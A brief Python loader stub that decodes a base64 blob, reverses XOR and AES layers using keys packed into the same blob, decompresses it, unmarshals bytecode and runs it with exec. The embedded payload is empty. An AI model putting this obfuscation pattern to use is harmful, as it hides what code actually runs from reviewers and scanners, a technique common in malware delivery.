import marshal, zlib, base64, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
xor_encrypt = lambda data, key: bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
aes_decrypt = lambda data, key: unpad(AES.new(key, AES.MODE_CBC, data[:16]).decrypt(data[16:]), AES.block_size)
 
encoded_data = b''

try:
    raw_data = base64.b64decode(encoded_data)
    aes_key, xor_key, xored = raw_data[:32], raw_data[32:48], raw_data[48:]
    compressed = aes_decrypt(xor_encrypt(xored, xor_key), aes_key)
    exec(marshal.loads(zlib.decompress(compressed)))
except Exception as e:
    print(f"Failed to execute encoded code: {e}")